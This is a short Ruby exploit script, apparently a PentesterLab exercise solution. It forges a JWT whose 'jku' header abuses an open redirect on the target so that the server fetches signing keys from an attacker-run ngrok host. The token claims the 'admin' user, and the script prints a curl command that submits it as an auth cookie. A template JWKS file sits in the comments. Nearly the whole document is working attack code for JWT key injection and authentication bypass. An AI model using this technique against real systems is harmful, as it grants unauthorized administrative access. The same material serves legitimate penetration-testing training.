#if 
#openredirect => http://ptl-17994f50-32958416.libcurl.so/.well-known/../redirect?redirect_uri=https://f3e6-73-129-14-72.ngrok.io/jwks.json
# 

header = {"typ":"JWT","alg":"RS256","jku":"http://ptl-17994f50-32958416.libcurl.so/.well-known/../redirect?redirect_uri=https://f3e6-73-129-14-72.ngrok.io/jwks.json"} # insert public server with key (can get the format from the original "jku")
payload = {"user":"admin"}

require 'openssl'
require 'base64'
require 'json'

k=OpenSSL::PKey::RSA.new File.read 'private.pem'

pub = k.public_key

data = Base64.urlsafe_encode64(header.to_json,padding: false)+"."+Base64.urlsafe_encode64(payload.to_json,padding: false)

sign = k.sign("SHA256",data)
puts data+"."+Base64.urlsafe_encode64(sign, padding: false)
token = data+"."+Base64.urlsafe_encode64(sign, padding: false)
puts "curl -H 'Cookie: auth=#{token}' http://ptl-17994f50-32958416.libcurl.so/"


# jwk.json (replace the n or e from output above)
# {
#   "keys": [
#     {
#       "kty": "RSA",
#       "use": "sig",
#       "kid": "pentesterlab",
#       "n": "rQG4QTMoZhWOFAKyXObuN3XH2nbAhQcOCYenm3dy-dGpEpkLQ8jnH7cU4eAI3YG3hTx4VFO_UdqX4EFk31HCrOpRrRyzkwq9A21Yf09Y1AsJes00YQIZUojUcDrA3TZZgnOwZvkc0rkQOTRmTuja1kRxiZM9SpolehDg1nszwd8Jo4fvAsiG3L9SdGxPEERHOrHZbvq_WeFOBDbAcT8ICmThiM6aA6AAwpRfmwruBygzyUS1JstfsEIsysTnft0zsV5ukYlTvaQbC1XtoMgRVAJ5-IGajSBYXMtLM89yxutk-RA_YHSc-IL38sZ5loJEA11S-uUiCyslcju0LqRbPQ",
#       "e": "AQAB",
#       "alg": "RS256"
#     }
#   ]
# }